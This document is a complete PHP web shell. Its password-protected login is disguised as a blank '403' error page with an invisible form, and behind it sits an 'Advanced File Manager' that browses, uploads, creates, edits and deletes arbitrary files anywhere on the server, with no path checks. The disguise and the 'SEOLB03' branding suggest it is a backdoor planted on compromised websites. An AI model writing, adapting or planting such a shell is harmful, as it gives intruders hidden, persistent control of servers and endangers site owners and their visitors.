<?php
session_start();

// Password baru yang sudah di-hash dengan bcrypt
$password = '$2y$10$x2XoZ2BnfRF0CIUKe9kE9.ub/qTZS09RDaHnglNVLAwIMFeyrZWmC'; // Ganti dengan hash bcrypt yang benar (lampha-thau)

function login_shell()
{
?>
<html>
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>403</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #fff;
            background-size: cover;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }

        .login-container {
            background: rgb(255, 255, 255); /* Transparansi latar belakang form */
            padding: 20px;
            border-radius: 8px;
            color: #fff;
            box-shadow: 0 4px 8px rgb(255, 255, 255);
            margin-top: 720px;
        }

        .login-container input[type="password"] {
            padding: 10px;
            margin-right: 10px;
            border: 1px solid #ffffff;
            border-radius: 4px;
            background: transparent;
            color: #000000;
            outline: none;
        }

        .login-container input[type="password"]::placeholder {
            color: #ffffff;
        }

        .login-container input[type="submit"] {
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            background: #ffffff;
            color: #ffffff;
            cursor: pointer;
            outline: none;
        }

        .login-container input[type="submit"]:hover {
            background: #ffffff;
        }

        .marquee-container {
            position: fixed;
            bottom: 0;
            left: 500px;
            right: 500px;
            height: 50px;
            overflow: hidden;
            background: rgb(255, 255, 255);
            display: flex;
            align-items: center;
            color: #fff;
        }

        .marquee {
            white-space: nowrap;
            display: inline-block;
            padding-left: 75%;
            animation: marquee 10s linear infinite;
        }

        @keyframes marquee {
            from {
                transform: translateX(100%);
            }
            to {
                transform: translateX(-100%);
            }
        }
    </style>
</head>
<body>
    <div class="marquee-container">
        <div class="marquee">
            copyright © SEOLB03
        </div>
    </div>
    <div class="login-container">
        <form action="" method="post">
            <div align="center">
                <input type="password" name="pass" placeholder="Password" required>
                <input type="submit" name="submit" value="Login">
            </div>
        </form>
    </div>
</body>
</html>
<?php
    exit;
}

if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $password)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
        header("refresh: 0;");
    } else {
        login_shell();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced File Manager</title>
    <style>
        body {
            background-color: #1e1e1e;
            color: #fff;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 30px;
        }
        .container {
            width: 80%;
            margin: 0 auto;
        }
        h2, h3 {
            color: #4CAF50;
        }
        input[type="file"], input[type="submit"], input[type="text"], input[type="button"], textarea {
            padding: 10px;
            margin: 10px 0;
            color: #fff;
            background-color: #333;
            border: none;
            border-radius: 5px;
        }
        input[type="file"], input[type="button"] {
            cursor: pointer;
        }
        form {
            margin-bottom: 20px;
        }
        a {
            color: #4CAF50;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        table {
            margin: 20px auto;
            border-collapse: collapse;
            width: 100%;
        }
        th, td {
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid #333;
        }
        th {
            background-color: #333;
        }
        td {
            background-color: #2c2c2c;
        }
        .icon {
            display: inline-block;
            margin-right: 10px;
        }
        .folder-icon {
            color: #ffcc00;
        }
        .file-icon {
            color: #4CAF50;
        }
        .action-btn {
            padding: 5px 10px;
            background-color: #f44336;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .action-btn:hover {
            background-color: #d32f2f;
        }
        .breadcrumbs {
            margin-bottom: 20px;
        }
        .breadcrumbs a {
            color: #4CAF50;
            text-decoration: none;
            margin-right: 5px;
        }
        .breadcrumbs a:hover {
            text-decoration: underline;
        }
        .breadcrumbs span {
            margin-right: 5px;
        }
        .manage-section {
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 15px;
        }
        .manage-section form {
            flex: 1;
            min-width: 200px;
        }
        textarea {
            width: 100%;
            height: 200px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Advanced File Manager</h2>

        <?php
        // Handle the current directory
        $currentDir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;

        // Create breadcrumbs for the current directory
        $pathParts = explode(DIRECTORY_SEPARATOR, $currentDir);
        $breadcrumbs = [];
        $pathAccumulator = '';

        foreach ($pathParts as $part) {
            if ($part !== '') {
                $pathAccumulator .= DIRECTORY_SEPARATOR . $part;
                $breadcrumbs[] = "<a href=\"?dir=" . urlencode($pathAccumulator) . "\">$part</a>";
            }
        }

        echo "<div class='breadcrumbs'><strong>Current Directory: </strong>";
        echo implode(' / ', $breadcrumbs);
        echo "</div>";

        // Handle directory change
        if (isset($_POST['changeDir'])) {
            $newDir = $_POST['newDir'];
            if (is_dir($newDir)) {
                $currentDir = realpath($newDir);
            } else {
                echo "<p>Directory does not exist.</p>";
            }
        }

        // Handle file upload
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
            $file = $_FILES['file'];
            if ($file['error'] === UPLOAD_ERR_OK) {
                $fileName = basename($file['name']);
                $fileTmpPath = $file['tmp_name'];
                $dest_path = $currentDir . '/' . $fileName;
                if (move_uploaded_file($fileTmpPath, $dest_path)) {
                    echo "<p>File uploaded successfully to $currentDir.</p>";
                } else {
                    echo "<p>Error moving the uploaded file.</p>";
                }
            } else {
                echo "<p>Error: No file selected or upload failed.</p>";
            }
        }

        // Handle file deletion
        if (isset($_GET['delete'])) {
            $fileToDelete = $_GET['delete'];
            if (is_file($fileToDelete)) {
                unlink($fileToDelete);
                echo "<p>File deleted: $fileToDelete</p>";
            }
        }

        // Handle directory creation
        if (isset($_POST['createDir'])) {
            $newDir = $_POST['newDirName'];
            $newDirPath = $currentDir . DIRECTORY_SEPARATOR . $newDir;
            if (!is_dir($newDirPath)) {
                mkdir($newDirPath);
                echo "<p>Directory created: $newDir</p>";
            } else {
                echo "<p>Directory already exists.</p>";
            }
        }

        // Handle file creation
        if (isset($_POST['createFile'])) {
            $newFile = $_POST['newFileName'];
            $newFilePath = $currentDir . DIRECTORY_SEPARATOR . $newFile;
            if (!file_exists($newFilePath)) {
                file_put_contents($newFilePath, ''); // Create an empty file
                echo "<p>File created: $newFile</p>";
            } else {
                echo "<p>File already exists.</p>";
            }
        }

        echo "<h3>Current Directory: $currentDir</h3>";

        // Display directory management forms
        echo '<div class="manage-section">';

        // Change directory form
        echo '<form method="post">';
        echo '<input type="text" name="newDir" placeholder="Enter new directory" required>';
        echo '<input type="submit" name="changeDir" value="Change Directory">';
        echo '</form>';

        // Create new directory form
        echo '<form method="post">';
        echo '<input type="text" name="newDirName" placeholder="New directory name" required>';
        echo '<input type="submit" name="createDir" value="Create Directory">';
        echo '</form>';

        // Create new file form
        echo '<form method="post">';
        echo '<input type="text" name="newFileName" placeholder="New file name" required>';
        echo '<input type="submit" name="createFile" value="Create File">';
        echo '</form>';

        // File upload form
        echo '<form action="" method="post" enctype="multipart/form-data">';
        echo '<input type="file" name="file" required>';
        echo '<input type="submit" value="Upload File">';
        echo '</form>';

        echo '</div>';

        echo "<h3>Files and Directories in $currentDir:</h3>";

        // List directories first, then files
        $files = scandir($currentDir);
        echo '<table>';
        echo '<tr><th>File/Directory Name</th><th>Action</th></tr>';

        // List directories
        foreach ($files as $file) {
            if ($file !== "." && $file !== ".." && is_dir($currentDir . '/' . $file)) {
                $filePath = $currentDir . '/' . $file;
                echo "<tr><td><span class='icon folder-icon'>ðŸ“</span><a href=\"?dir=" . urlencode($filePath) . "\">$file</a></td>";
                echo "<td><a href=\"?dir=" . urlencode($currentDir) . "&delete=" . urlencode($filePath) . "\"><button class='action-btn'>Delete</button></a></td></tr>";
            }
        }

        // List files
        foreach ($files as $file) {
            if ($file !== "." && $file !== ".." && is_file($currentDir . '/' . $file)) {
                $filePath = $currentDir . '/' . $file;
                echo "<tr><td><span class='icon file-icon'>ðŸ“„</span><a href=\"$filePath\" target=\"_blank\">$file</a></td>";
                echo "<td>
                        <a href=\"?dir=" . urlencode($currentDir) . "&delete=" . urlencode($filePath) . "\">
                            <button class='action-btn'>Delete</button>
                        </a>
                        <a href=\"?dir=" . urlencode($currentDir) . "&edit=" . urlencode($filePath) . "\">
                            <button class='action-btn'>Edit</button>
                        </a>
                      </td></tr>";
            }
        }

        echo '</table>';

        // Edit file
        if (isset($_GET['edit'])) {
            $fileToEdit = $_GET['edit'];
            if (is_file($fileToEdit)) {
                $fileContent = file_get_contents($fileToEdit);
                echo "<h3>Edit File: $fileToEdit</h3>";
                echo '<form method="post">';
                echo '<textarea name="fileContent">' . htmlspecialchars($fileContent) . '</textarea>';
                echo '<input type="submit" name="saveFile" value="Save Changes">';
                echo '</form>';

                // Handle saving edited file
                if (isset($_POST['saveFile'])) {
                    $newContent = $_POST['fileContent'];
                    file_put_contents($fileToEdit, $newContent);
                    echo "<p>File updated successfully.</p>";
                }
            } else {
                echo "<p>File not found for editing.</p>";
            }
        }

        ?>
    </div>
</body>
</html>
